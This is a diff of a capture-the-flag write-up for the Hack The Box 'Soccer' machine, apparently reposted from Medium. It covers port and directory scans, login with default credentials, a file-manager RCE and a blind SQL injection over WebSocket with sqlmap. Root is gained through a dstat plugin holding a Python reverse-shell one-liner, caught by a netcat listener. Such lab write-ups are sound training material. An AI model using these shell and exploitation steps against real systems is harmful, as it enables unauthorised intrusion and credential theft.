@@ -1,20 +1,14 @@
 # :game_die: SOCCER [HTB-EASY]. This is the writeup of the soccer…
 
-> **Original Source:** [SOCCER [HTB-EASY]. This is the writeup of the soccer…](https://infosecwriteups.com/soccer-htb-easy-d2062aff5fa9)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 This is the writeup of the soccer machine on hackthebox.
-
 
 *SOCCER*
 
 ## ENUMERATION:
 
-
 PORT SCAN:
-
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ctfs/Soccer-htb]
@@ -113,22 +107,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Jan 5 05:48:32 2023 -- 1 IP address (1 host up) scanned in 73.31
 ```
 
-
 So we have a nginx webserver running at port 80 and a mali service at port 9091.
 
 ## WEBSERVER ENUMERTION:
 
-
 **MAIN PAGE:**
 
-
 The main page of the website looks like this. There is nothing important in the source code as well.
-
 
 *indexpage*
 
 ### TECH PROFILE:
-
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ctfs/Soccer-htb]
@@ -137,9 +126,7 @@ http://soccer.htb [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPS
 
 ```
 
-
 **DIRECTORY SCAN:**
-
 
 ```
 ________________________________________________
@@ -160,95 +147,67 @@ tiny [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 152ms]
 :: Progress: [20469/20469] :: Job [1/1] :: 260 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
 ```
 
-
 We found a new directory named tiny.
-
 
 Let’s visit it.
 
-
 *Tiny File Manager*
-
 
 This is a login portal for tiny file manager.
 
-
 Let’s find some exploits for this service.
-
 
 We found a RCE exploit for tinyfilemanager but this is authenticated so we first need to find some credentials to get this working.
 
-
 After reading their [github](https://github.com/prasathmani/tinyfilemanager)page i found some default creds.
-
 
 *Default Creds*
 
-
 Let’s try them.
-
 
 Now we can try the RCE Exploit we found which uses directory traversal and RCE to trigger remote access.
 
-
 *Permission Error*
-
 
 We can’t seem to upload the shell in the webroot because we don’t have proper permissions.
 
-
 Let’s find a directory and where we can upload files.
-
 
 Let’s change our exploit so it will upload shell in the directory where we have permissions.
 
-
 ## Get Hashar Mujahid’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
-
 
 If you can’t get exploit working you can just upload a shell in the directory and visit the exploit in the new tab.
 
 ## INITIAL FOOTHOLD [www-data]:
 
-
 By uploading a shell and triggering it we can receive a reverse shell.
-
 
 *Reverse shell*
 
-
 Now stabilize the shell and then we can start working on privileges’ escalation part.
-
 
 *Stabilized shell*
 
 ## PRIVILLEGE ESCALATION {Player}:
 
-
 Let’s throw linpeas and see what we can find.
 
-
 *Subdomain*
-
 
 Let’s add his to our hosts file and see what we are dealing with.
 
 ## WEBSITE:
 
-
 *New Functionalities*
-
 
 Let’s signup and log in.
 
 ### DIRECTORY SCAN:
-
 
 ```
 :: URL : http://soc-player.soccer.htb/FUZZ
@@ -274,9 +233,7 @@ signup [Status: 200, Size: 3741, Words: 1015, Lines: 105, Duration: 169ms]
 bash
 ```
 
-
 Let’s visit the check directory.
-
 
 ```
 <script>
@@ -325,40 +282,30 @@ p.textContent = msg
 </script>
 ```
 
-
 After analysing the source code which shows a javascript code that establish a new WebSocket connection to the server at the URL “ws://soc-player.soccer.htb:9091”. When the page is loaded, it sets up an event listener for when the user presses the “Enter” key in the input element with the ID “id”. When the “Enter” key is pressed, the function “sendText” is called. The “sendText” function is used to send a message to the server through the WebSocket connection. The message consists of a JSON object with a single property “id” and a value equal to the value of the input element.The code also has a function called “append”, which is called when the WebSocket connection receives a message from the server. The function takes the message as an argument and sets the text content of the “p” element to the message.
-
 
 The input parameter could be vulnerable to sqli injection but we cannot test it using sqlmap.
 
-
 Let’s search google for sql injection in websockets.
-
 
 *SQL INJECTION AUTOMTION*
 
-
 Grab the script that allows us to use sqlmap and act as a proxy between the websocket and the sqlmap.
-
 
 Make the necessary changes. `ws_server = "ws://soc-player.soccer.htb:9091"`
 
-
 and change the `data = '{"id":"%s"}' % message`. Run this script in the one terminal and open another terminal to run sqlmap.
-
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ctfs/Soccer-htb]
 └─$ sqlmap -u "http://localhost:8081/?id=1" -p "id" --dbs
 ```
 
-
 After running the sqlmap we can see the id parameter is vulnerable to blind sql injection. Let’s retrieve the databases and their content.
 
 >
 
 Blind sql injection takes a long time to retrieve content from databases . So be patient.
-
 
 ```
 available databases [5]:
@@ -373,21 +320,17 @@ available databases [5]:
 [*] ending @ 05:20:12 /2023-01-06/
 ```
 
-
 Dump data .
-
 
 We will get credentials in plain text for player.
 
 ## **PRIVILLEGE ESCALATION [ROOT]**
-
 
 We got the ssh credentials using the sql injection in previous section let’s login and find a way to escalate our privileges to root.
 
 >
 
 *We have credentials of player let’s run sudo -l*
-
 
 ```
 player@soccer:~$ sudo -l
@@ -396,17 +339,13 @@ Sorry, user player may not run sudo on localhost.
 player@soccer:~$
 ```
 
-
 Let’s run linpeas.
-
 
 >
 
 Doas is a privilege escalation program similar to sudo. It is designed to be as lightweight and simple as possible. It is the default privilege escalation program for OpenBSD but also available for other UNIX-like operating systems through the OpenDoas program.
 
-
 This can be used to gain privileges’ of the root. Dstat allows to run custom module. We can make a module and run it with dstat.
-
 
 ```
 player@soccer:/tmp/temp$ nano dstat_temp.py
@@ -415,9 +354,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 player@soccer:/tmp/temp$
 ```
 
-
 Now copy this plugin to dstat directory. and don’t forget to start a netcat listner.
-
 
 ```
 player@soccer:/tmp/temp$ cp dstat_temp.py /usr/local/share/dstat/
@@ -426,9 +363,7 @@ player@soccer:/tmp/temp$ doas -u root /usr/bin/dstat --temp
 import imp
 ```
 
-
 On our listner we should get a connection back.
-
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ctfs/Soccer-htb]
@@ -448,6 +383,3 @@ soccer
 ```
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/soccer-htb-easy-d2062aff5fa9). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
